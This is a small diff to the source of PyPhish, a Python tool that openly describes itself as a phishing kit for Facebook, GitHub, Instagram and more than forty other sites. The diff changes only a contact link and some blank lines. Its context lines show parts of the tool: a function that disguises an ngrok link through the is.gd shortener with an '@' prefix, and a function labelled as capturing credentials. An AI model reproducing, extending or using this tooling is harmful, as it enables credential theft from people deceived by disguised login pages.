@@ -3,7 +3,7 @@
 # Version : 1.0
 # Author  : SnehKr
 # Github  : https://github.com/SnehKr
-# Contact : https://m.me/SnehKr
+# Contact : https://t.me/SnehKr
 # PyPhish is a phishing tool in python
 # Facebook Phishing, Github Phishing, Instagram Phishing and 40+ other sites available
 # Portable file/script
@@ -830,7 +830,6 @@ def server():
             killer()
             exit()
 
-
 # Optional function for ngrok url masking
 def masking(url):
     website= "https://is.gd/create.php\?format\=simple\&url\="+url
@@ -893,7 +892,6 @@ def url_manager(url,num1,num2):
             masked=inform.read()
             print(info2+"URL "+num2+" > "+yellow+masked.strip()+"@"+url.replace("https://",""))
 
-
 # Last function capturing credentials
 def waiter():
     system("rm -rf $HOME/.site/ip.txt")
@@ -940,4 +938,5 @@ if __name__ == '__main__':
         main()
     except KeyboardInterrupt:
         pexit()
+        
 # If this code helped you, consider staring repository. Your stars encourage me a lot!
